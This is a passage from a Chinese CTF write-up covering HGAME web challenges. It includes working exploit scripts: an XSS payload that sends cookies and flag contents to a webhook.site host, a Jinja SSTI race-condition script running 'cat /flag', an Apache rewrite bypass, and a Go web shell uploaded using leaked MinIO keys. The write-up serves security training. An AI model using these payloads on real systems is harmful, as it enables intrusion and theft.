class="built_in">print</span>(<span class="string">&quot;[*] 执行路径穿越重命名...&quot;</span>)</span><br><span class="line">rename_data = &#123;</span><br><span class="line">    <span class="string">&quot;oldName&quot;</span>: <span class="string">&quot;exploit.ejs&quot;</span>,</span><br><span class="line">    <span class="string">&quot;newName&quot;</span>: <span class="string">&quot;../views/mortis.ejs&quot;</span>  <span class="comment"># 覆盖模板文件</span></span><br><span class="line">&#125;</span><br><span class="line">rename_res = requests.post(<span class="string">f&quot;<span class="subst">&#123;TARGET&#125;</span>/rename&quot;</span>, json=rename_data)</span><br><span class="line"><span class="keyword">if</span> rename_res.status_code != <span class="number">200</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[-] 重命名失败:&quot;</span>, rename_res.text)</span><br><span class="line">    exit()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] 模板覆盖成功&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3. 触发模板渲染获取flag</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[*] 触发模板渲染...&quot;</span>)</span><br><span class="line">time.sleep(<span class="number">1</span>)  <span class="comment"># 等待服务器加载新模板</span></span><br><span class="line">flag_res = requests.get(TARGET)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 提取flag（根据实际响应结构调整）</span></span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;hgame&#123;&quot;</span> <span class="keyword">in</span> flag_res.text:</span><br><span class="line">    start = flag_res.text.index(<span class="string">&quot;hgame&#123;&quot;</span>)</span><br><span class="line">    end = flag_res.text.index(<span class="string">&quot;&#125;&quot;</span>, start) + <span class="number">1</span></span><br><span class="line">    flag = flag_res.text[start:end]</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[+] Flag获取成功: <span class="subst">&#123;flag&#125;</span>&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[!] 在响应中未找到flag，请手动检查:&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(flag_res.text)</span><br></pre></td></tr></table></figure>

<h3 id="Level-69-MysteryMessageBoard"><a href="#Level-69-MysteryMessageBoard" class="headerlink" title="Level 69 MysteryMessageBoard"></a>Level 69 MysteryMessageBoard</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">func main() &#123;</span><br><span class="line">	r := gin.Default()</span><br><span class="line">	r.GET(&quot;/login&quot;, loginHandler)</span><br><span class="line">	r.POST(&quot;/login&quot;, loginHandler)</span><br><span class="line">	r.GET(&quot;/logout&quot;, logoutHandler)</span><br><span class="line">	r.GET(&quot;/&quot;, indexHandler)</span><br><span class="line">	r.GET(&quot;/admin&quot;, adminHandler)</span><br><span class="line">	r.GET(&quot;/flag&quot;, flagHandler)</span><br><span class="line">	log.Println(&quot;Server started at :8888&quot;)</span><br><span class="line">	log.Fatal(r.Run(&quot;:8888&quot;))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>不能直接访问flag</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20250222203709886.png" alt="image-20250222203709886"></p>
<p>爆破</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20250222203736739.png" alt="image-20250222203736739"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;location.href=&quot;https://webhook.site/5xxx420-4def-9884-50771b3e7b1b/&quot;+document.cookie&lt;/script&gt;</span><br><span class="line">&lt;script&gt;location.href=&quot;http://17x3/&quot;+document.cookie&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://webhook.site/541f57b2-1420-4def-9884-50771b3e7b1b/session=MTc0MDIyOTgzMHxEWDhFQVFMX2dBQUJFQUVRQUFBcF80QUFBUVp6ZEhKcGJtY01DZ0FJZFhObGNtNWhiV1VHYzNSeWFXNW5EQWtBQjNOb1lXeHNiM1E9fIijZBwSkcJs7ZWmGcolxQ8y5b8w2-erUTzZIGX02dxk</span><br></pre></td></tr></table></figure>

<p>但不知道为什么访问不了</p>
<p>最后写了脚本：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment"># 配置参数</span></span><br><span class="line">target_url = <span class="string">&quot;http://node1.hgame.vidar.club:30143&quot;</span></span><br><span class="line">webhook_url = <span class="string">&quot;https://webhook.site/541f57b2xxx0-4def-9884-50771b3e7b1b&quot;</span>  <span class="comment"># 替换为你的Webhook URL</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 步骤1：登录普通用户获取session</span></span><br><span class="line">login_url = <span class="string">f&quot;<span class="subst">&#123;target_url&#125;</span>/login&quot;</span></span><br><span class="line">login_data = &#123;</span><br><span class="line">    <span class="string">&quot;username&quot;</span>: <span class="string">&quot;shallot&quot;</span>,</span><br><span class="line">    <span class="string">&quot;password&quot;</span>: <span class="string">&quot;888888&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">response = requests.post(login_url, data=login_data)</span><br><span class="line">session_cookie = response.cookies.get(<span class="string">&quot;session&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 检查是否登录成功</span></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> session_cookie:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;登录失败，请检查凭证或服务状态。&quot;</span>)</span><br><span class="line">    exit()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 步骤2：提交XSS评论</span></span><br><span class="line">comment_url = <span class="string">f&quot;<span class="subst">&#123;target_url&#125;</span>/&quot;</span></span><br><span class="line">comment_payload = <span class="string">f&#x27;&lt;script&gt;fetch(&quot;/flag&quot;).then(r =&gt; r.text()).then(d =&gt; fetch(&quot;<span class="subst">&#123;webhook_url&#125;</span>?flag=&quot; + encodeURIComponent(d)))&lt;/script&gt;&#x27;</span></span><br><span class="line">comment_data = &#123;</span><br><span class="line">    <span class="string">&quot;comment&quot;</span>: comment_payload</span><br><span class="line">&#125;</span><br><span class="line">cookies = &#123;</span><br><span class="line">    <span class="string">&quot;session&quot;</span>: session_cookie</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment"># 需要允许重定向，确保POST请求成功</span></span><br><span class="line">response = requests.post(comment_url, data=comment_data, cookies=cookies, allow_redirects=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> response.status_code != <span class="number">200</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;提交评论失败，状态码：&quot;</span>, response.status_code)</span><br><span class="line">    exit()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 步骤3：触发管理员访问评论页面</span></span><br><span class="line">admin_url = <span class="string">f&quot;<span class="subst">&#123;target_url&#125;</span>/admin&quot;</span></span><br><span class="line">response = requests.get(admin_url, cookies=cookies)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;攻击完成，请检查Webhook接收的flag。&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>成功了</p>
<p>hgame{W0w_y0u_5r4_9o0d_4t_xss}</p>
<h3 id="Level-38475-角落"><a href="#Level-38475-角落" class="headerlink" title="Level 38475 角落"></a>Level 38475 角落</h3><p>dirsearch</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20250223170101562.png" alt="image-20250223170101562"></p>
<p>app.conf:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"># Include by httpd.conf</span><br><span class="line">&lt;Directory &quot;/usr/local/apache2/app&quot;&gt;</span><br><span class="line">	Options Indexes</span><br><span class="line">	AllowOverride None</span><br><span class="line">	Require all granted</span><br><span class="line">&lt;/Directory&gt;</span><br><span class="line"></span><br><span class="line">&lt;Files &quot;/usr/local/apache2/app/app.py&quot;&gt;</span><br><span class="line">    Order Allow,Deny</span><br><span class="line">    Deny from all</span><br><span class="line">&lt;/Files&gt;</span><br><span class="line"></span><br><span class="line">RewriteEngine On</span><br><span class="line">RewriteCond &quot;%&#123;HTTP_USER_AGENT&#125;&quot; &quot;^L1nk/&quot;</span><br><span class="line">RewriteRule &quot;^/admin/(.*)$&quot; &quot;/$1.html?secret=todo&quot;</span><br><span class="line"></span><br><span class="line">ProxyPass &quot;/app/&quot; &quot;http://127.0.0.1:5000/&quot;</span><br></pre></td></tr></table></figure>

<p>这里要利用RewriteRule和RewriteCond</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">RewriteEngine On</span><br><span class="line">RewriteCond &quot;%&#123;HTTP_USER_AGENT&#125;&quot; &quot;^L1nk/&quot;   # 条件：User-Agent 以 &quot;L1nk/&quot; 开头</span><br><span class="line">RewriteRule &quot;^/admin/(.*)$&quot; &quot;/$1.html?secret=todo&quot;  # 将 /admin/xxx 重写为 /xxx.html?secret=todo</span><br></pre></td></tr></table></figure>

<ol>
<li>当用户访问 <code>/admin/flag</code> 时，若其 User-Agent 满足 <code>^L1nk/</code>（以 “L1nk&#x2F;“ 开头），则触发重写。</li>
<li>最终请求会被转换为 <code>/flag.html?secret=todo</code>，服务器返回此路径的内容。</li>
</ol>
<p>因此可以</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://node1.hgame.vidar.club:30383/admin/usr/local/apache2/app/app.py%3f</span><br><span class="line">User-Agent L1nk/</span><br></pre></td></tr></table></figure>

<p>访问&#x2F;usr&#x2F;local&#x2F;apache2&#x2F;app&#x2F;app.py</p>
<blockquote>
<p>不能直接&#x2F;admin&#x2F;usr&#x2F;local&#x2F;apache2&#x2F;app&#x2F;app.py，apache 的配置中明确禁止访问 <code>/usr/local/apache2/app/app.py</code></p>
<p>即使伪造了 User-Agent，重写规则会将请求转换为：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/local/apache2/app/app.py?.html?secret=todo</span><br></pre></td></tr></table></figure>

<p>此时会把?.html?secret&#x3D;todo当成参数</p>
</blockquote>
<p>如下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template, render_template_string, redirect</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> templates</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">pwd = os.path.dirname(__file__)</span><br><span class="line">show_msg = templates.show_msg</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">readmsg</span>():</span><br><span class="line">	filename = pwd + <span class="string">&quot;/tmp/message.txt&quot;</span></span><br><span class="line">	<span class="keyword">if</span> os.path.exists(filename):</span><br><span class="line">		f = <span class="built_in">open</span>(filename, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">		message = f.read()</span><br><span class="line">		f.close()</span><br><span class="line">		<span class="keyword">return</span> message</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		<span class="keyword">return</span> <span class="string">&#x27;No message now.&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/index&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">	status = request.args.get(<span class="string">&#x27;status&#x27;</span>)</span><br><span class="line">	<span class="keyword">if</span> status <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">		status = <span class="string">&#x27;&#x27;</span></span><br><span class="line">	<span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>, status=status)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/send&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write_message</span>():</span><br><span class="line">	filename = pwd + <span class="string">&quot;/tmp/message.txt&quot;</span></span><br><span class="line">	message = request.form[<span class="string">&#x27;message&#x27;</span>]</span><br><span class="line"></span><br><span class="line">	f = <span class="built_in">open</span>(filename, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">	f.write(message) </span><br><span class="line">	f.close()</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> redirect(<span class="string">&#x27;index?status=Send successfully!!&#x27;</span>)</span><br><span class="line">	</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/read&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read_message</span>():</span><br><span class="line">	<span class="keyword">if</span> <span class="string">&quot;&#123;&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> readmsg():</span><br><span class="line">		show = show_msg.replace(<span class="string">&quot;&#123;&#123;message&#125;&#125;&quot;</span>, readmsg())</span><br><span class="line">		<span class="keyword">return</span> render_template_string(show)</span><br><span class="line">	<span class="keyword">return</span> <span class="string">&#x27;waf!!&#x27;</span></span><br><span class="line">	</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">	app.run(host = <span class="string">&#x27;0.0.0.0&#x27;</span>, port = <span class="number">5000</span>)</span><br></pre></td></tr></table></figure>

<p>send：%7B%7B7*7%7D%7D</p>
<p>都不行</p>
<p>后来用了条件竞争</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line">TARGET = <span class="string">&quot;http://node1.hgame.vidar.club:30383/app/&quot;</span></span><br><span class="line">PAYLOAD = <span class="string">&quot;&#123;&#123;config.__class__.__init__.__globals__[&#x27;os&#x27;].popen(&#x27;cat /flag&#x27;).read()&#125;&#125;&quot;</span>  <span class="comment"># 或读取文件的 Payload</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send_payload</span>():</span><br><span class="line">    <span class="comment"># 清空旧消息，确保检查通过</span></span><br><span class="line">    requests.post(TARGET + <span class="string">&quot;send&quot;</span>, data=&#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;clean&quot;</span>&#125;)</span><br><span class="line">    <span class="comment"># 快速写入恶意 Payload</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        requests.post(TARGET + <span class="string">&quot;send&quot;</span>, data=&#123;<span class="string">&quot;message&quot;</span>: PAYLOAD&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read_flag</span>():</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        r = requests.get(TARGET + <span class="string">&quot;read&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;hgame&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[+] Flag found:&quot;</span>, r.text)</span><br><span class="line">            exit()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 启动 20 个写入线程和 20 个读取线程</span></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>):</span><br><span class="line">    threading.Thread(target=send_payload).start()</span><br><span class="line">    threading.Thread(target=read_flag).start()</span><br></pre></td></tr></table></figure>



<p>给了一个main，upx脱壳</p>
<p>发现：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20250223181832354.png" alt="image-20250223181832354"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">access_key：minio_admin</span><br><span class="line">secret_key：JPSQ4NOBvh2/W7hzdLyRYLDm0wNRMG48BL09yOKGpHs=</span><br></pre></td></tr></table></figure>

<p><code>Minio Client</code></p>
<p>下载：<a target="_blank" rel="noopener" href="https://dl.min.io/client/mc/release/">https://dl.min.io/client/mc/release/</a></p>
<p>使用：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/panw/p/16801534.html">https://www.cnblogs.com/panw/p/16801534.html</a></p>
<p>添加云储存服务：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/mc config host add minio http://node1.hgame.vidar.club:30133 minio_admin JPSQ4NOBvh2/W7hzdLyRYLDm0wNRMG48BL09yOKGpHs= --api s3v4</span><br></pre></td></tr></table></figure>

<p>查看储存内容：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">./mc ls minio</span><br><span class="line">[2025-01-17 22:11:05 CST]     0B hints/</span><br><span class="line">[2025-01-17 22:11:09 CST]     0B prodbucket/</span><br></pre></td></tr></table></figure>

<p>发现有hints文件夹，进去看看：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./mc ls minio/hints</span><br><span class="line">[2025-01-17 22:11:05 CST] 8.2KiB STANDARD src.zip</span><br></pre></td></tr></table></figure>

<p>是源码，把它下载下来：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./mc cp minio/hints/src.zip ./src.zip</span><br><span class="line">...314/hints/src.zip: 8.24 KiB / 8.24 KiB [============================================================] 11.75 KiB/s 0s</span><br></pre></td></tr></table></figure>

<p>源码：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">package main</span><br><span class="line"></span><br><span class="line">import (</span><br><span class="line">	&quot;level25/fetch&quot;</span><br><span class="line"></span><br><span class="line">	&quot;level25/conf&quot;</span><br><span class="line"></span><br><span class="line">	&quot;github.com/gin-gonic/gin&quot;</span><br><span class="line">	&quot;github.com/jpillora/overseer&quot;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">func main() &#123;</span><br><span class="line">	fetcher := &amp;fetch.MinioFetcher&#123;</span><br><span class="line">		Bucket:    conf.MinioBucket,</span><br><span class="line">		Key:       conf.MinioKey,</span><br><span class="line">		Endpoint:  conf.MinioEndpoint,</span><br><span class="line">		AccessKey: conf.MinioAccessKey,</span><br><span class="line">		SecretKey: conf.MinioSecretKey,</span><br><span class="line">	&#125;</span><br><span class="line">	overseer.Run(overseer.Config&#123;</span><br><span class="line">		Program: program,</span><br><span class="line">		Fetcher: fetcher,</span><br><span class="line">	&#125;)</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">func program(state overseer.State) &#123;</span><br><span class="line">	g := gin.Default()</span><br><span class="line">	g.StaticFS(&quot;/&quot;, gin.Dir(&quot;.&quot;, true))</span><br><span class="line">	g.Run(&quot;:8080&quot;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>引用了overseer，说明程序是热加载的，文件变更会自动重启。重写一个main.go，加一个命令执行路由，update上去，就可以rce了。</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">	<span class="string">&quot;level25/fetch&quot;</span></span><br><span class="line">	<span class="string">&quot;os/exec&quot;</span></span><br><span class="line"> </span><br><span class="line">	<span class="string">&quot;level25/conf&quot;</span></span><br><span class="line"> </span><br><span class="line">	<span class="string">&quot;github.com/gin-gonic/gin&quot;</span></span><br><span class="line">	<span class="string">&quot;github.com/jpillora/overseer&quot;</span></span><br><span class="line">)</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	fetcher := &amp;fetch.MinioFetcher&#123;</span><br><span class="line">		Bucket:    conf.MinioBucket,</span><br><span class="line">		Key:       conf.MinioKey,</span><br><span class="line">		Endpoint:  conf.MinioEndpoint,</span><br><span class="line">		AccessKey: conf.MinioAccessKey,</span><br><span class="line">		SecretKey: conf.MinioSecretKey,</span><br><span class="line">	&#125;</span><br><span class="line">	overseer.Run(overseer.Config&#123;</span><br><span class="line">		Program: program,</span><br><span class="line">		Fetcher: fetcher,</span><br><span class="line">	&#125;)</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">program</span><span class="params">(state overseer.State)</span></span> &#123;</span><br><span class="line">	g := gin.Default()</span><br><span class="line">	g.GET(<span class="string">&quot;/test&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">		c.String(<span class="number">200</span>, <span class="string">&quot;good&quot;</span>)</span><br><span class="line">	&#125;)</span><br><span class="line">	g.GET(<span class="string">&quot;/shell&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">		<span class="comment">// 获取URL中的command参数</span></span><br><span class="line">		command := c.DefaultQuery(<span class="string">&quot;cmd&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">		<span class="keyword">if</span> command != <span class="string">&quot;&quot;</span> &#123;</span><br><span class="line">			<span class="comment">// 执行命令</span></span><br><span class="line">			out, err := exec.Command(<span class="string">&quot;sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, command).Output()</span><br><span class="line">			<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">				c.String(<span class="number">500</span>, fmt.Sprintf(<span class="string">&quot;Error executing command: %v&quot;</span>, err))</span><br><span class="line">			&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">				c.String(<span class="number">200</span>, fmt.Sprintf(<span class="string">&quot;Command Output:\n%s&quot;</span>, out))</span><br><span class="line">			&#125;</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			c.String(<span class="number">400</span>, <span class="string">&quot;No command provided&quot;</span>)</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;)</span><br><span class="line"> </span><br><span class="line">	g.Run(<span class="string">&quot;:8080&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">go build -o update</span><br><span class="line">mc cp ./update minio/prodbucket/update</span><br></pre></td></tr></table></figure>



<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20250223211827437.png" alt="image-20250223211827437"></p>
<h3 id="Level-21096-HoneyPot"><a href="#Level-21096-HoneyPot" class="headerlink" title="Level 21096 HoneyPot"></a>Level 21096 HoneyPot</h3><p>漏洞点：</p>
<p>导入数据部分有个命令执行</p>
